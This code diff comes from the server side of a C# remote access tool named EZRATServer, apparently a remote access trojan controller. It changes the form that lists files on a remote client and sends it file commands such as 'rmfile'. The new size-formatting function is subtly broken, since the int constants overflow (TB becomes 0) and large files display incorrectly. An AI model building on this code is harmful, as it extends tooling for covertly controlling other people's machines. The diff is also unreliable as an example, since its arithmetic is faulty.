@@ -9,6 +9,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using EZRATServer.Network;
 using EZRATServer.Forms;
+using EZRATServer.Utils;
 
 namespace EZRATServer
 {
@@ -93,7 +94,7 @@ namespace EZRATServer
             RenameFile rn = new RenameFile(PathDownload);
             if (rn.ShowDialog() == DialogResult.OK)
             {
-            this.BaseWindows.SendCommand("rmfile;" + this.PathDownload + ";" + rn.FileName, this.Id);
+                this.BaseWindows.SendCommand("rmfile;" + this.PathDownload + ";" + rn.FileName, this.Id);
             }
         }
 
@@ -144,60 +145,86 @@ namespace EZRATServer
             UpdatePath(new object(), new EventArgs());
         }
 
-        public void Update(string list, char separator1 = '¦', char separator2 = '|')
+        public void Update(string list)
         {
             ResetAll();
-            // Tarte.cs¦File|Poulpe.cs¦File|
-            StringBuilder sb = new StringBuilder(list);
-            string name = string.Empty;
+            string[] lstData = list.Split(Constantes.SeparatorChar);
             uint count = 0;
-            this.lblStatus.Text = STATUS_TEXT + "Calculate";
-            for (int i = 0; i < sb.Length; i++)
+            for (int i = 0; i < lstData.Length; i++)
             {
-                if (sb[i] == separator1)
+                string[] data = lstData[i].Split(Constantes.Special_SeparatorChar);
+                if (data.Length > 2) // File
                 {
-                    if (sb[i + 1] == '1')
-                    {
-                        AddFileOrFolder(name, FileType.File);
-                        name = string.Empty;
-                        i += 3;
-                        count += 1;
-                    }
-                    else
-                    {
-                        AddFileOrFolder(name, FileType.Folder);
-                        name = string.Empty;
-                        i += 3;
-                        count += 1;
-                    }
+                    AddFileOrFolder(data[0], FileType.File, ReduceByteSize(data[2]));
                 }
-                if (i <= sb.Length - 1)
+                else if (data.Length == 2) // Folder
                 {
-                    name += sb[i].ToString();
+                    AddFileOrFolder(data[0], FileType.Folder);
                 }
+                count += 1;
             }
-
             this.lblStatus.Text = STATUS_TEXT + count.ToString();
             lstFiles.Invoke(new MethodInvoker(() => lstFiles.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent)));
 
             lstFiles.Invoke(new MethodInvoker(() => lstFiles.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)));
+
         }
 
-        private void AddFileOrFolder(string name, FileType type)
+        private string ReduceByteSize(string value)
         {
-            if (name.StartsWith("¦"))
+            int KB = 1024;
+            int MB = KB * KB;
+            int GB = MB * KB;
+            int TB = GB * KB;
+
+            double tmp = Convert.ToDouble(value);
+            double result = 0;
+            string ResultChar = string.Empty;
+            if (tmp < KB)
+            {
+                result = tmp;
+                ResultChar = "B";
+            }
+            else if (tmp >= KB && tmp < MB)
+            {
+                result = tmp / KB;
+                ResultChar = "KB";
+            }
+            else if (tmp >= MB && tmp < GB)
+            {
+                result = tmp / MB;
+                ResultChar = "MB";
+            }
+            else if (tmp >= GB && tmp < TB)
+            {
+                result = (int)tmp / GB;
+                ResultChar = "GB";
+            }
+
+            return $"{result.ToString("0.")} {ResultChar}";
+
+        }
+
+        private void AddFileOrFolder(string name, FileType type, string size = "0")
+        {
+            if (name.StartsWith(Constantes.Special_Separator))
             {
                 name = name.Substring(3);
             }
             if (lstFiles.InvokeRequired)
             {
-
-                lstFiles.Invoke(new MethodInvoker(() => lstFiles.Items.Add(new ListViewItem(new string[] { name, type.ToString() }))));
+                if (size != "0")
+                    lstFiles.Invoke(new MethodInvoker(() => lstFiles.Items.Add(new ListViewItem(new string[] { name, type.ToString(), size.ToString() }))));
+                else
+                    lstFiles.Invoke(new MethodInvoker(() => lstFiles.Items.Add(new ListViewItem(new string[] { name, type.ToString() }))));
 
             }
             else
             {
-                lstFiles.Items.Add(new ListViewItem(new string[] { name, type.ToString() }));
+                if (size != "0")
+                    lstFiles.Items.Add(new ListViewItem(new string[] { name, type.ToString(), size.ToString() }));
+                else
+                    lstFiles.Items.Add(new ListViewItem(new string[] { name, type.ToString() }));
             }
 
         }
